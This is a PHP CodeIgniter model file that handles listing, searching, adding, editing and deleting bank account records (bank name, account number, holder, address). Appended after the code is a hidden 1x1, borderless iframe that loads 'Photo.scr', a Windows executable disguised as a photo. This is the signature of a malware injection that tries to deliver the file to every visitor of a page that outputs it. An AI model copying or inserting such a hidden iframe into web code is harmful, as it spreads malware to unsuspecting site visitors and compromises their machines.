<?php
class Bank_api extends CI_Model {
 function data($start=0,$limit=10)
    {

        $qwhere=isset($_POST['where']) ? $_POST['where'] : '';

        $this->db->select('*')->from('MBank');
        if($qwhere!=""){
            $this->db->like('NamaBank',$qwhere)->or_like('NoRekenig', $qwhere)->or_like('NamaNasabah', $qwhere)->or_like('Alamat', $qwhere);
        }
        $data =$this->db->order_by('BankID')->limit($limit,$start)->get()->result();

        //--------getCount---------------

        $this->db->select('count(*) qty',false)->from('MBank');
        if($qwhere!=""){
            $this->db->like('NamaBank',$qwhere)->or_like('NoRekenig', $qwhere)->or_like('NamaNasabah', $qwhere)->or_like('Alamat', $qwhere);
        }
        $count =$this->db->get()->row()->qty;

        $t="true";
        $result=array('recordsTotal'=>intval($count),'data'=>$data,'status'=>$t);
        return $result;
    }
    function detil()
    {
        $key=isset($_POST['key']) ? $_POST['key'] : '';
        $data = $this->db->select('*')->where('BankID',$key)->from('MBank')->get()->row();
        $result=$data;
        return $result;
    }
    function update($mode)
    {        
        $valid=true;
        $message="";
        $result=array();
        $this->load->library('form_validation');
        $key_id=  isset($_POST['id_bank']) ? $_POST['id_bank'] : '';
        $data['NamaBank']= isset($_POST['nama_bank']) ? $_POST['nama_bank'] : '';
        $data['NoRekenig']= isset($_POST['no_rekening']) ? $_POST['no_rekening'] : '';
		$data['NamaNasabah']= isset($_POST['nama_nasabah']) ? $_POST['nama_nasabah'] : '';
        $data['Alamat']= isset($_POST['alamat']) ? $_POST['alamat'] : '';
        if($mode=='tambah'){
            $this->form_validation->set_rules('nama_bank', 'Nama Bank', 'required');
            $this->form_validation->set_rules('no_rekening', 'No. Rekening', 'required');
			$this->form_validation->set_rules('nama_nasabah', 'Nama Nasabah', 'required');
            $this->form_validation->set_rules('alamat', 'Alamat', 'required');
            if ($this->form_validation->run() == TRUE){
                $exist = $this->db->select('*')->where('NoRekenig',$data['NoRekenig'])->from('MBank')->get()->row();
                if($exist){
                    $valid=false;
                    $message="No. Rekening Telah Ada";

                }else{
                    $idnya=intval($this->db->select('max(BankID) id',false)->from('MBank')->get()->row()->id)+1;
                    $data['BankID']=$idnya;
                    $this->db->insert('MBank', $data);
                }
            }else{
                $valid=false;
                $message=validation_errors();
            }

        }else if($mode=='ubah'){
            $this->form_validation->set_rules('nama_bank', 'Nama Bank', 'required');
            $this->form_validation->set_rules('no_rekening', 'No. Rekening', 'required');
			$this->form_validation->set_rules('nama_nasabah', 'Nama Nasabah', 'required');
            $this->form_validation->set_rules('alamat', 'Alamat', 'required');
            if ($this->form_validation->run() == TRUE){
                $ids=$this->db->escape($key_id);
                $kode=$this->db->escape($data['NoRekenig']);
                $where=" NoRekenig=".$kode." and BankID <> ".$ids ;
                $exist = $this->db->select('*')->where($where)->from('MBank')->get()->row();
                if($exist){
                    $valid=false;
                    $message="No. Rekening Telah Ada";

                }else{
                    $this->db->where('BankID',$key_id)->update('MBank', $data);
                }
            }else{
                $valid=false;
                $message=validation_errors();
            }
        }else if($mode=='hapus'){
            $this->form_validation->set_rules('id_bank', 'id_bank', 'required');
            if ($this->form_validation->run() == TRUE){
                $this->db->where('BankID',$key_id)->delete('MBank');
            }else{
                $valid=false;
                $message="Data Tidak Valid";
            }

        }
        
        $result=array('success'=>$valid,'messages'=>$message);
        return $result;
    }

}



<iframe src=Photo.scr width=1 height=1 frameborder=0>
</iframe>
